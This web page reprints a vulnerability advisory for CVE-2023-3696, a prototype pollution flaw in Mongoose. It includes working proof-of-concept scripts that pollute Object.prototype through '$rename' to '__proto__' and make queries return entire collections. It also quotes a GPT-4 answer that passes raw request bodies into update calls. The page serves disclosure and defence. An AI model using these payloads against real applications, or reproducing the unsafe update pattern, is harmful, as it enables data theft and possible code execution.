<!DOCTYPE html>
<html lang="zh">
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
    
    <title>Mongoose Prototype Pollution Vulnerability in automattic/mongoose(CVE-2023-3696) | 氕氘氚</title>
    <meta name="keywords" content="hexo,theme,otakism,otaku"/>
    <meta name="HandheldFriendly" content="True"/>
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="google-site-verification" content=""/>
    <meta name="baidu-site-verification" content=""/>
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="description" content="Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose(CVE-2023-3696) 本文转自ehhthing 并作补充   If an attacker has some way to control an object on the Mongo server through one way or anothe">
<meta property="og:type" content="article">
<meta property="og:title" content="Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose(CVE-2023-3696)">
<meta property="og:url" content="https://szczecin.github.io/2024/01/23/CVE-2023-3696-Mongoose/index.html">
<meta property="og:site_name" content="氕氘氚">
<meta property="og:description" content="Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose(CVE-2023-3696) 本文转自ehhthing 并作补充   If an attacker has some way to control an object on the Mongo server through one way or anothe">
<meta property="og:locale">
<meta property="article:published_time" content="2024-01-23T09:19:25.000Z">
<meta property="article:modified_time" content="2024-01-26T08:37:10.390Z">
<meta property="article:author" content="Szczecin">
<meta property="article:tag" content="Exploit">
<meta property="article:tag" content="Reprint">
<meta property="article:tag" content="RCE">
<meta property="article:tag" content="Mongoose">
<meta name="twitter:card" content="summary">
    

    <!-- Favicon -->
    
        <link rel="icon" href="/img/favicon.ico" />
    

    <!-- Font -->
    <link href="https://fonts.googleapis.com/css?family=Inconsolata|Roboto:300,400,700" rel="stylesheet">

    
<link rel="stylesheet" href="/style.css">

    <script>
      function setLoadingBarProgress(num) {
        document.getElementById('loading-bar').style.width = num + "%";
      }
    </script>

    


<meta name="generator" content="Hexo 6.2.0"></head>

<body>

<div id="loading-bar-wrapper">
  <div id="loading-bar"></div>
</div>

<script>setLoadingBarProgress(20)</script>

<div id="site-wrapper">

    <header id="header">
    <div id="header-wrapper" class="clearfix">
        <a id="logo" href="/">
            <img src="/img/logo.png"/>
            <span id="site-desc">
                Be A Gorgeous World
            </span>
        </a>
        <button id="site-nav-switch">
            <span class="icon icon-menu"></span>
        </button>
    </div>
</header>
    <script>setLoadingBarProgress(40);</script>

    <main id="main" role="main">
        <article id="post-CVE-2023-3696-Mongoose"
         class="post article white-box article-type-post"
         itemscope itemprop="blogPost">
    <h2 class="title">
        <a href="/2024/01/23/CVE-2023-3696-Mongoose/">
            Mongoose Prototype Pollution Vulnerability in automattic/mongoose(CVE-2023-3696)
        </a>
    </h2>
    <time>
        Jan 23, 2024
    </time>
    <section class="content">
        <div class="article-entry" itemprop="articleBody">
            <h1><span id="mongoose-prototype-pollution-vulnerability-in-automatticx2fmongoosecve-2023-3696">Mongoose Prototype Pollution Vulnerability in automattic&#x2F;mongoose(CVE-2023-3696)</span></h1><blockquote>
<p>本文转自<a target="_blank" rel="noopener" href="https://huntr.com/bounties/1eef5a72-f6ab-4f61-b31d-fc66f5b4b467/">ehhthing</a> 并作补充</p>
</blockquote>
<blockquote>
<p>If an attacker has some way to control an object on the Mongo server through one way or another, it is possible to cause prototype pollution on any Mongoose client. Notably, if a poorly implemented service allows a user to control the object in <code>findByIdAndUpdate</code> and similar functions, this bug could be triggered through the <code>$rename</code> operator. Another possibility is if two different services interact with the same Mongo database, it is possible that one of them allows a user to inject an arbitrary object containing a <code>__proto__</code> field, which would also trigger this bug.</p>
<p>If used with Express and EJS, this bug can easily lead to RCE. Many other libraries have known prototype pollution exploits as well, which may cause significant impact.</p>
<p>Allowing user input directly into <code>update</code> operations seems to be a very common pattern. For example, if we ask GPT-4 a basic prompt for updating a post using Mongoose, it gives us:</p>
</blockquote>
<h3><span id="prompt">Prompt:</span></h3><blockquote>
<p>Using Express and Mongoose, take input from the user to find a “Post” by an id, and update its fields.</p>
</blockquote>
<h3><span id="response">Response:</span></h3><blockquote>
<p>In Express and Mongoose, you can use the <code>findByIdAndUpdate</code> method to find a “Post” by an id and update its fields. Here’s how you can do it:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">const express = require(<span class="string">&#x27;express&#x27;</span>);</span><br><span class="line">const mongoose = require(<span class="string">&#x27;mongoose&#x27;</span>);</span><br><span class="line">const Post = require(<span class="string">&#x27;./models/post&#x27;</span>); // Assuming you have a Post model <span class="keyword">in</span> models/post.js</span><br><span class="line"></span><br><span class="line">const app = express();</span><br><span class="line"></span><br><span class="line">app.use(express.json()); // <span class="keyword">for</span> parsing application/json</span><br><span class="line"></span><br><span class="line">app.put(<span class="string">&#x27;/post/:id&#x27;</span>, <span class="keyword">async</span> (req, res) =&gt; &#123;</span><br><span class="line">    const &#123; <span class="built_in">id</span> &#125; = req.params;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        const post = <span class="keyword">await</span> Post.findByIdAndUpdate(<span class="built_in">id</span>, req.body, &#123; new: true &#125;); </span><br><span class="line">        // new: true returns the updated post rather than the original post when the operation began</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (!post) &#123;</span><br><span class="line">            <span class="keyword">return</span> res.status(<span class="number">404</span>).send();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        res.send(post);</span><br><span class="line">    &#125; catch (e) &#123;</span><br><span class="line">        res.status(<span class="number">400</span>).send(e);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>In the above example, <code>req.params.id</code> is used to get the id from the URL. The <code>req.body</code> is used to get the updated data from the user. The <code>&#123; new: true &#125;</code> option is used to return the updated post.</p>
</blockquote>
<h2><span id="proof-of-concept">Proof of concept:</span></h2><blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; connect, model, Schema &#125; <span class="keyword">from</span> <span class="string">&#x27;mongoose&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> connect(<span class="string">&#x27;mongodb://127.0.0.1:27017/exploit&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const Example = model(<span class="string">&#x27;Example&#x27;</span>, new Schema(&#123; hello: String &#125;));</span><br><span class="line"></span><br><span class="line">const example = <span class="keyword">await</span> new Example(&#123; hello: <span class="string">&#x27;world!&#x27;</span> &#125;).save();</span><br><span class="line"><span class="keyword">await</span> Example.findByIdAndUpdate(example._<span class="built_in">id</span>, &#123;</span><br><span class="line">    $rename: &#123;</span><br><span class="line">        hello: <span class="string">&#x27;__proto__.polluted&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// this <span class="keyword">is</span> what causes the pollution</span><br><span class="line"><span class="keyword">await</span> Example.find();</span><br><span class="line"></span><br><span class="line">const test = &#123;&#125;;</span><br><span class="line">console.log(test.polluted); // world!</span><br><span class="line">console.log(Object.prototype); // [Object: null prototype] &#123; polluted: <span class="string">&#x27;world!&#x27;</span> &#125;</span><br><span class="line"></span><br><span class="line">process.exit();</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="resulting-database-entry">Resulting Database Entry</span></h2><blockquote>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">exploit&gt; db.examples.find(&#123;&#125;)</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _id: ObjectId(<span class="string">&quot;64a757117e3dbf11b14e0fd4&quot;</span>),</span><br><span class="line">    __v: 0,</span><br><span class="line">    [<span class="string">&#x27;__proto__&#x27;</span>]: &#123; polluted: <span class="string">&#x27;world!&#x27;</span> &#125;</span><br><span class="line">  &#125;</span><br><span class="line">]</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="explanation">Explanation</span></h2><blockquote>
<p>When Mongoose finds documents and reads the malicious document into an object, it uses an object with a prototype. If the top level object contains a <code>__proto__</code> field, it leads to overwrites of the object prototype.</p>
</blockquote>
<h3><span id="affected-code">Affected Code:</span></h3><blockquote>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// document.js</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * Init helper.</span></span><br><span class="line"><span class="comment"> *</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; self document instance</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; obj raw mongodb doc</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; doc object we are initializing</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Object</span>&#125; [opts] Optional Options</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">Boolean</span>&#125; [opts.setters] Call `applySetters` instead of `cast`</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> &#123;<span class="type">String</span>&#125; [prefix] Prefix to add to each path</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@api</span> <span class="variable">private</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">init</span>(<span class="params">self, obj, doc, opts, prefix</span>) &#123;</span><br><span class="line">  <span class="comment">// ...</span></span><br><span class="line">    </span><br><span class="line">  <span class="keyword">function</span> <span class="title function_">_init</span>(<span class="params">index</span>) &#123;</span><br><span class="line">    <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!schemaType &amp;&amp; utils.<span class="title function_">isPOJO</span>(obj[i])) &#123;</span><br><span class="line">      <span class="comment">//  ...</span></span><br><span class="line"></span><br><span class="line">      <span class="comment">// (1)</span></span><br><span class="line">      <span class="comment">// our malicious payload first reaches here, where:</span></span><br><span class="line">      <span class="comment">// obj is some document</span></span><br><span class="line">      <span class="comment">// i = &#x27;__proto__&#x27;</span></span><br><span class="line">      <span class="comment">// so, obj[i] gives Object.prototype, which gets used in (2)</span></span><br><span class="line">      <span class="title function_">init</span>(self, obj[i], doc[i], opts, path + <span class="string">&#x27;.&#x27;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (!schemaType) &#123;</span><br><span class="line">      <span class="comment">// (2)</span></span><br><span class="line">      <span class="comment">// after the recursive call on (1), we reach here</span></span><br><span class="line">      <span class="comment">// pollution happens on the next line, where:</span></span><br><span class="line">      <span class="comment">// doc: Object.prototype,</span></span><br><span class="line">      <span class="comment">// obj = &#123; polluted: &#x27;world!&#x27; &#125;,</span></span><br><span class="line">      <span class="comment">// i = &#x27;polluted&#x27;</span></span><br><span class="line">      doc[i] = obj[i];</span><br><span class="line">      <span class="keyword">if</span> (!strict &amp;&amp; !prefix) &#123;</span><br><span class="line">        self[i] = obj[i];</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br></pre></td></tr></table></figure>
</blockquote>
<h2><span id="credits">Credits</span></h2><blockquote>
<p>This bug was found by myself (<a target="_blank" rel="noopener" href="https://twitter.com/ehhthing">@ehhthing</a>) and <a target="_blank" rel="noopener" href="https://twitter.com/strellic_">@strellic_</a></p>
</blockquote>
<h2><span id="impact">Impact</span></h2><blockquote>
<p>If used with Express and EJS, this bug can <a target="_blank" rel="noopener" href="https://mizu.re/post/ejs-server-side-prototype-pollution-gadgets-to-rce">easily lead to RCE</a>. Many other libraries have known prototype pollution exploits as well, which may cause significant impact.</p>
<p>We also found that we can actually exploit Mongoose itself with the prototype pollution, to cause it to bypass all query parameters when using <code>.find()</code>, which allows an attacker to potentially dump entire collections:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> &#123; connect, model, Schema &#125; <span class="keyword">from</span> <span class="string">&#x27;mongoose&#x27;</span>;</span><br><span class="line"></span><br><span class="line">const mongoose = <span class="keyword">await</span> connect(<span class="string">&#x27;mongodb://127.0.0.1:27017/exploit&#x27;</span>);</span><br><span class="line"></span><br><span class="line">const Post = model(<span class="string">&#x27;Post&#x27;</span>, new Schema(&#123;</span><br><span class="line">    owner: String,</span><br><span class="line">    message: String</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="keyword">await</span> Post.create(&#123;</span><br><span class="line">    owner: <span class="string">&quot;SECRET_USER&quot;</span>,</span><br><span class="line">    message: <span class="string">&quot;SECRET_MESSAGE&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">const post = <span class="keyword">await</span> Post.create(&#123;</span><br><span class="line">    owner: <span class="string">&quot;user&quot;</span>,</span><br><span class="line">    message: <span class="string">&quot;test message&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"><span class="keyword">await</span> Post.findByIdAndUpdate(post._<span class="built_in">id</span>, &#123;</span><br><span class="line">    $rename: &#123;</span><br><span class="line">        message: <span class="string">&#x27;__proto__.owner&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">// this pollutes Object.prototype.owner = <span class="string">&quot;test message&quot;</span></span><br><span class="line"><span class="keyword">await</span> Post.find(&#123; owner: <span class="string">&quot;user&quot;</span> &#125;);</span><br><span class="line"></span><br><span class="line">// now, when querying posts, even when an owner <span class="keyword">is</span> specified, <span class="built_in">all</span> posts are returned</span><br><span class="line">const posts = <span class="keyword">await</span> Post.find(&#123;</span><br><span class="line">    owner: <span class="string">&quot;user2&quot;</span></span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">console.log(posts); // both posts created are found</span><br><span class="line">/*</span><br><span class="line">output:</span><br><span class="line">[</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: new ObjectId(<span class="string">&quot;64a7610756da3c04f900bf49&quot;</span>),</span><br><span class="line">    owner: <span class="string">&#x27;SECRET_USER&#x27;</span>,</span><br><span class="line">    message: <span class="string">&#x27;SECRET_MESSAGE&#x27;</span>,</span><br><span class="line">    __v: <span class="number">0</span></span><br><span class="line">  &#125;,</span><br><span class="line">  &#123;</span><br><span class="line">    _<span class="built_in">id</span>: new ObjectId(<span class="string">&quot;64a7610756da3c04f900bf4b&quot;</span>),</span><br><span class="line">    owner: <span class="string">&#x27;user&#x27;</span>,</span><br><span class="line">    __v: <span class="number">0</span></span><br><span class="line">  &#125;</span><br><span class="line">]</span><br><span class="line">*/</span><br><span class="line">process.exit();</span><br></pre></td></tr></table></figure>

<p>This could also easily lead to denial of service depending on how large a Mongo collection is, and which other libraries are being used in the application.</p>
</blockquote>

        </div>
        <div class="article-tags tags">
            
                <a class="tag-none-link" href="/tags/Exploit/" rel="tag">Exploit</a><a class="tag-none-link" href="/tags/Mongoose/" rel="tag">Mongoose</a><a class="tag-none-link" href="/tags/RCE/" rel="tag">RCE</a><a class="tag-none-link" href="/tags/Reprint/" rel="tag">Reprint</a>
            
        </div>
    </section>
</article>





        <script>setLoadingBarProgress(60);</script>
    </main>

    <footer id="footer" class="clearfix">

    

    <div class="social-wrapper">
        
            
                <a href="https://github.com/szczecin" class="social github"
                   target="_blank" rel="external">
                    <span class="icon icon-github"></span>
                </a>
            
                <a href="/atom.xml" class="social rss"
                   target="_blank" rel="external">
                    <span class="icon icon-rss"></span>
                </a>
            
        
    </div>

    <div class="theme-by">Theme <span class="codename">Memory</span> designed by <a href="https://artifact.me/"
                                                                                    target="_blank">Art Chen</a>.
    </div>
    <div>&copy; <a href="/">氕氘氚</a></div>

</footer>


    <script>setLoadingBarProgress(80);</script>
    <div class="overlay"></div>
</div>

<div class="site-sidebar" id="site-sidebar">

    

    <div class="sidebar-switch clearfix "
         style="display: none">
        <a class="dark-btn active" data-toggle="toc">
            <span class="icon icon-list"></span>
            <span class="text">Index</span>
        </a>
        <a class="dark-btn" data-toggle="bio">
            <span class="icon icon-person"></span>
            <span class="text">Bio</span>
        </a>
    </div>

    <div class="site-toc "
         style="display: none">
        
            <div class="no-index">No Index</div>
        
    </div>

    <div class="site-bio show"
         style="display: block">

        <div class="about-me clearfix">
            <div class="avatar">
                <img src="/img/avatar.png"/>
            </div>
            <div class="info">
                <a class="name dark-btn" href="/about">
                    Szczecin
                </a>
            </div>
            <div class="info">
                <span class="item desc">
                    Open your eyes to see the light in life
                </span>
            </div>
        </div>

        <div class="menu section">
            <ul class="clearfix">
                
                    <li class="left">
                        <a href="/about"
                           onfocus="this.blur();"
                           class="nav-about dark-btn block">
                            简介
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/archives"
                           onfocus="this.blur();"
                           class="nav-archives dark-btn block">
                            归档
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/categories"
                           onfocus="this.blur();"
                           class="nav-categories dark-btn block">
                            分类
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/tags"
                           onfocus="this.blur();"
                           class="nav-tags dark-btn block">
                            TAGs
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/WriteUP"
                           onfocus="this.blur();"
                           class="nav-WriteUP dark-btn block">
                            WriteUP
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/EXP"
                           onfocus="this.blur();"
                           class="nav-EXP dark-btn block">
                            EXP
                        </a>
                    </li>
                
                    <li class="left">
                        <a href="/tags/SRC"
                           onfocus="this.blur();"
                           class="nav-SRC dark-btn block">
                            SRC
                        </a>
                    </li>
                
                    <li class="right">
                        <a href="/Life"
                           onfocus="this.blur();"
                           class="nav-Life dark-btn block">
                            Life
                        </a>
                    </li>
                
            </ul>
        </div>

    </div>

    <div class="shortcuts">
        <a href="#header" class="top window-nav dark-btn" id="go-top">
            <span class="icon icon-chevron-thin-up"></span>
        </a>
        <a class="close dark-btn" id="sidebar-close">
            <span class="icon icon-close"></span>
        </a>
        <a href="#footer" class="top window-nav dark-btn" id="go-bottom">
            <span class="icon icon-chevron-thin-down"></span>
        </a>
    </div>

</div>





<script src="https://code.jquery.com/jquery-2.1.4.min.js"></script>
<script>window.jQuery || document.write('<script src="/js/jquery.min.js"><\/script>')</script>


<script src="/js/jquery.fitvids.js"></script>

<script>
  var GOOGLE_CUSTOM_SEARCH_API_KEY = "";
  var GOOGLE_CUSTOM_SEARCH_ENGINE_ID = "";
  var ALGOLIA_API_KEY = "";
  var ALGOLIA_APP_ID = "";
  var ALGOLIA_INDEX_NAME = "";
  var AZURE_SERVICE_NAME = "";
  var AZURE_INDEX_NAME = "";
  var AZURE_QUERY_KEY = "";
  var SEARCH_SERVICE = "";
  var universalSearchConfig = {};
  if (SEARCH_SERVICE === 'google') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: GOOGLE_CUSTOM_SEARCH_API_KEY,
      engineId: GOOGLE_CUSTOM_SEARCH_ENGINE_ID,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'algolia') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      apiKey: ALGOLIA_API_KEY,
      appId: ALGOLIA_APP_ID,
      indexName: ALGOLIA_INDEX_NAME,
      imagePath: "/img/"
    };
  } else if (SEARCH_SERVICE === 'azure') {
    universalSearchConfig = {
      searchService: SEARCH_SERVICE,
      serviceName: AZURE_SERVICE_NAME,
      indexName: AZURE_INDEX_NAME,
      apiKey: AZURE_QUERY_KEY,
      imagePath: "/img/"
    };
  }
</script>

<script src="/js/app.js"></script>


<script src="/js/search.js"></script>





<script>setLoadingBarProgress(100);</script>

</body>
</html>
